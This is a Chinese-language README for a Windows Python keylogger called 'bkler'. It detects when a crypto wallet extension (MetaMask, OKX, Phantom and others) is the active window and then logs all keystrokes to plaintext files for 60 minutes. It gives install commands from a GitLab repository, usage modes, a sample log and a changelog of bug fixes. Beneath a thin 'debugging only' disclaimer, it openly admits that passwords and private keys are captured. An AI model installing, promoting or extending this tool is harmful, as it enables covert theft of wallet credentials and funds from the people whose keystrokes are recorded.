# 钱包键盘记录器 (Wallet Keylogger)

持续检测活动窗口，匹配钱包关键词时触发键盘记录，记录到 `~/.dev/bkler/recording_{日期}.log`

## 功能特性

- **持续检测** - 后台线程持续检测活动窗口（每 0.2 秒）
- **自动触发** - 检测到钱包窗口时自动开始记录
- **限时记录** - 自动记录 60 分钟后停止
- **Windows 平台** - 支持 Windows 系统
- **智能匹配** - 检测 Unknown 窗口和钱包关键词
- **调试模式** - 实时显示窗口信息，记录所有按键
- **高性能** - 持久文件句柄、预计算模式匹配、窗口缓存

## 工作原理

程序后台持续检测活动窗口（每 0.2 秒），当满足以下条件时自动触发记录：
- 窗口标题为 `Unknown`（钱包扩展下拉窗口）
- 窗口标题包含钱包关键词（OKX, MetaMask, Wallet, Phantom 等）

## 安装

### 推荐：使用 uv tool install（全局安装）

```bash
# 安装 uv（如果尚未安装）
curl -LsSf https://astral.sh/uv/install.sh | sh

# 从 GitLab 仓库安装工具
uv tool install git+https://gitlab.com/web3toolsbox/bkler.git

# 直接使用命令
bkler
```

### 使用 pip 安装

```bash
# 克隆项目
git clone https://gitlab.com/web3toolsbox/bkler.git
cd bkler
pip install -e .
```

安装后可直接使用命令：

```bash
bkler
```

### 直接运行（无需安装）

```bash
# 克隆项目
git clone https://gitlab.com/web3toolsbox/bkler.git
cd bkler
pip install -r requirements.txt
python bkler.py
```

## 使用方法

### 正常模式

```bash
bkler
```

程序启动后会持续检测活动窗口，当打开钱包扩展（如 OKX、MetaMask 等）时，自动开始记录 60 分钟。

### 调试模式

```bash
bkler --debug
```

调试模式会：
- 记录所有按键（不仅限于钱包窗口）
- 实时显示当前窗口信息
- 标记是否匹配钱包窗口（`[触发]` 或 `[普通]`）

按 `F12` 键退出程序，或使用 `Ctrl+C`

### 查看日志

```bash
cat ~/.dev/bkler/recording_*.log
```

## 包结构

```
bkler/
├── bkler/                 # 包目录
│   ├── __init__.py        # 包初始化与导出
│   ├── cli.py             # 命令行入口（argparse）
│   ├── detectors.py       # Windows 窗口检测（ctypes + 缓存）
│   └── logger.py          # 核心记录器类（多线程 + 持久文件句柄）
├── bkler.py               # 独立脚本入口
├── debug_windows.py       # 窗口调试工具
├── pyproject.toml         # 包配置（hatchling + uv 兼容）
├── .python-version        # Python 版本固定（3.12）
├── requirements.txt       # 依赖列表
└── README.md              # 说明文档
```

## 日志格式

```
[时间] [状态] [窗口名称] 按键内容
```

示例：

```
# --- 记录开始: 2026-05-28 15:30:00 ---
# 触发窗口: [Unknown]
[2026-05-28 15:30:05] [触发] [Unknown] 1
[2026-05-28 15:30:06] [触发] [Unknown] 2
[2026-05-28 15:30:07] [触发] [Unknown] 3
[2026-05-28 15:30:08] [触发] [Unknown] 4
[2026-05-28 15:30:09] [触发] [Unknown] 5
[2026-05-28 15:30:10] [触发] [Unknown] [Enter]
# --- 记录结束: 2026-05-28 16:30:00 ---
```

## 安全注意事项

⚠️ **重要警告**

1. 此工具仅用于**开发调试目的**
2. 日志文件包含**明文键盘记录**，包括可能输入的密码
3. 请妥善保管日志文件，使用后及时删除
4. **不要**在生产环境或他人设备上使用
5. 敏感信息（密码、私钥等）会被记录

## 许可

仅供个人学习研究使用。

## 更新日志

### v0.2.1

- **修复：死锁导致日志无记录** - `_monitor_windows` 线程在持有锁的情况下调用 `start_recording()`，而后者内部再次获取同一把不可重入锁，导致线程永久阻塞
- **修复：`recording_timer` 竞态条件** - timer 的读写现在全部在锁保护范围内
- **修复：`debug_windows.py` 中 `wintypes` 引用错误** - 未限定模块路径
- **优化：持久文件句柄** - 避免每次按键都 open/close 文件，减少 I/O 系统调用
- **优化：按键映射表提升为类属性** - 避免高频调用时重复构建字典
- **优化：预计算小写模式列表** - `EXTENSION_PATTERNS` 和 `BROWSER_PATTERNS` 的 `.lower()` 只执行一次
- **优化：减少重复窗口检测** - `should_trigger_recording()` 支持传入已获取的窗口名，`_monitor_windows` 中不再重复调用
- **优化：退出时正确关闭文件句柄**
